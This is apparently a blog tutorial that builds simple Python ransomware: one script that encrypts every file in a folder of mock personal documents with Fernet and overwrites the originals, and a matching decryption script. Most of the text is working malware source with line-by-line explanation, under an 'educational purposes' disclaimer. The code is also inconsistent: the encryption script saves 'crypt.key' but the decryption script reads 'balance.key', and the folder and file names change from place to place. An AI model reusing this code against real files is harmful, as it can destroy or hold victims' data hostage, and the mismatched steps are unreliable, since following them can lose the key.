## Introduction

In a previous article, we learned how hackers uploaded a Ransomware script to PyPI. In this tutorial, we will learn how to create a similar malicious script using Python! We will actually create two scripts, one script which will `encrypt` our files using an encryption `key`, and another script which will `decrypt` our files using the same `key`. 
> 👉 **Note**: It is this `key` that is sold to the victim to decrypt their files. 



## LEGAL DISCLAIMER 

When it comes to the legality of encryption software, it is legal to possess. However, installing it on a computer for the purpose of malicious intent you obviously violating federal law. Additionally, please be careful about accidentally encrypting your own personal files, and losing your encryption key... If you do, then it's [Game Over Man, Game Over!](http://www.moviesoundclips.net/movies1/aliens/gameover.mp3) Remember, the goal of this tutorial is for `security awareness`, and `educational purposes`. 

## What is Ransomware?

Ransomware is a type of malware that threatens to block access to a victim's personal data unless a ransom is paid. The usual method of blocking access to a victim's computer is done via `encryption`. Encryption is the method by which data is scrambled and converted into a code, and only the parties who have the correct decryption `key` will be able to read it.



## Project Setup 

For this project, we will set up a project directory called `MyMalware`. Within this directory, we will create another directory called `myPersonalData` which will contain `mock` personal data. Just for fun, I included the following files within the `myPersonalData` directory to represent real-life important data that may be store on a person's hard drive:

- `bank_account_information.txt`
- `birth_cert.png`
- `important_file.txt`, and
- `ssn_card.png`

Additionally, we will store the encryption script (`chaos.py`), the decryption script (`order.py`), and our key (`balance.key`) within the Project root directory, see `Directory Structure` below. Our Python script will collect the files within the `myPersonalData` directory, generate an encryption key (`balance.key`), and then encrypt the files using this key.

## Directory Structure 

Here is a diagram of the project directory. 

```
MyMalware/
├─ myDataFiles/
│  ├─ bank_account_info.txt
│  ├─ birth_cert.png
│  ├─ important_file.txt    
│  ├─ ssn_card.png 
| 
├─ chaos.py
├─ order.py
├─ balance.key
```
>  👉 **Note**: `balance.key` will be created when `chaos.py` is ran. 


## myPersonalData Files Before Encryption

Here is a screenshot of one of our important files before encryption:

![Image of important files](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ahlkhoo9t7pasjhs9li5.png)
 
## The Encryption Script (`choas.py`) 

```python
import os
from cryptography.fernet import Fernet

files = [file for file in os.listdir('myPersonalData')]

crypt_key = Fernet.generate_key()
with open('crypt.key', 'wb') as key_object:
    key_object.write(crypt_key)

for file in files:
    path = os.path.join('myPersonalData', file)
    with open(path, 'rb') as fo:
        contents = fo.read()

    encrypted_content = Fernet(crypt_key).encrypt(contents)

    with open(path, 'wb') as fo:
        fo.write(encrypted_content)
```

## Code Explanation

## Lines 1-2: Importing Required Libraries 

```python
import os
from cryptography.fernet import Fernet
```

- `os` : The OS module provides functions for interacting with the operating system.
- `cryptography`: The [cryptography](https://pypi.org/project/cryptography/) module provides cryptographic recipes and primitives to Python developers.
- `Fernet`: is a symmetric encryption method which makes sure that the message encrypted cannot be read without the key. Fernet also uses 128-bit AES.

## Line 4: Collect and Store Files in a List

```python
files = [file for file in os.listdir('myDataFiles')]
```
On line 4, we collect all of the files with the `myPersonalData` directory and store them in a list called files.

## Lines 6-8: Generate the Encryption Key

```python
crypt_key = Fernet.generate_key()
with open('crypt.key', 'wb') as key_object:
    key_object.write(crypt_key)
```

On line 6, we generate an encryption key by creating a `Fernet` object and naming it `crypt_key`. Line 7, we open our `key_object` file (`balance.key`) in `wb` mode (_writing in binary mode_), and line 8, we write the `crypt_key` data to `key_object`. If you print your `crypt_key` object, it should look something similar to the following:

```python
print(crypt_key)
# b'yARJsZNlN9LvX8hWrjiAAPDadCYn1E8ksHnpXn6yjPI='
```

> **Note**: Your `crypt_key` value will be different from the value seen in the screenshot above.

## Lines 10-15: Encrypt the Files using the Key:

```python
for file in files:
    path = os.path.join('myPersonalData', file)
    with open(path, 'rb') as fo:
        contents = fo.read()

    encrypted_content = Fernet(crypt_key).encrypt(contents)
```

On line 10, we use a `for loop` to iterate over the list of `files`, on line 11, we create a `path` variable to the files location, on line 12, we open each file in `rb` mode, (_read binary mode_), and on line 13, we load its contents in a variable named `contents`.

On line 15, still within the `for loop` on line 10, we then encrypt the `contents` of each file using `Fernet` by passing our `crypt_key` as a parameter to encrypt each file and saving the contents as `encrypted_content`.

## Line 17-18: Overwrite the Unencrypted Content

```python
    with open(path, 'wb') as fo:
        fo.write(encrypted_content)
```

Now that we have encrypted the contents, we need to `write` the contents back to the directory. On line 17, still within the `for loop` on line 10, we will open each file in `wb` mode (_writing binary_) as file_object, and write the encrypted_content to each file_object.

## Now, let's unleash Chaos! 

After running the encryption script, let's examine the contents of each file in the `myPersonalData` directory. 

## myPersonalData Files After Encryption

![Image of encrypted directory](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ahufxxsfzdy96jtnxfc2.png)

As you can see, we can no longer see the thumbnail images of the image files (`birth_certificate.png` and `ssn_card.png`). Now, lets open and examine each file in our `myPersonalData` directory. As you can see from the following screenshot below, the contents of both the text and image files have been encrypted! 

### Text Files have been Encrypted 

![Image of files encrypted](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/fha7meldjzr77a8tk5b3.png)
 

### Image files have been Encrypted 

![Birth Certificate](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/8100vkmczn7r2oq0fgh9.png) 

![Social Security Card](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/uos9x5zi3jnwvbinhnkh.png) 

## The Decryption Script (`order.py`) 

Now that we have encrypted our files, it is time to decrypt them. Let's examine our decryption script:

```python
import os
from cryptography.fernet import Fernet

files = [file for file in os.listdir('myPersonalData')]

with open('balance.key', 'rb') as key_object:
    secret_key = key_object.read()

for file in files:
    path = os.path.join('myPersonalData', file)
    with open(path, 'rb') as fo:
        contents = fo.read()

    decrypted_content = Fernet(secret_key).decrypt(contents)

    with open(path, 'wb') as fo:
        fo.write(decrypted_content)
```
##  Code Explanation

As you can see, the decryption script (`order.py`) is very similar to the encryption script (`choas.py`). Therefore, instead of explaining the whole script, I will just cover the portions that are different.

## Line 6-7: Open the Encryption Key 

```python
with open('balance.key', 'rb') as key_object:
    secret_key = key_object.read()
```

On line 6, we open our `balance.key` in `rb` mode as `key_object`, and on line 7, save the contents of `key_object` into a variable named `secret_key`.

## Line 14: Decrypt the Files using the Key:

```python
    decrypted_content = Fernet(secret_key).decrypt(contents)
```

On line 14, we then decrypt the `contents` of each file using `Fernet` by passing our `secret_key` as a parameter to decrypt each file, and saving the contents as `decrypted_content` this time.

## Let's Restore Order! 

After running the decryption script (`order.py`), let's examine the contents of each file in the `myPersonalData` directory again. 

## Image Files have been Restored 

As you can tell from the screenshot, the image files of our `birth_certificate.png` and `ssn_card.png` have been restored! 

![Image of unencrypted files](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/fywyrsyjov8p2q3poom2.png)

Let's open and examine our other important files again. As you can see from the screenshot below, `Order` has been restored through `Balance`!

## Text Files have been Restored 

![Image of important files](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ahlkhoo9t7pasjhs9li5.png)

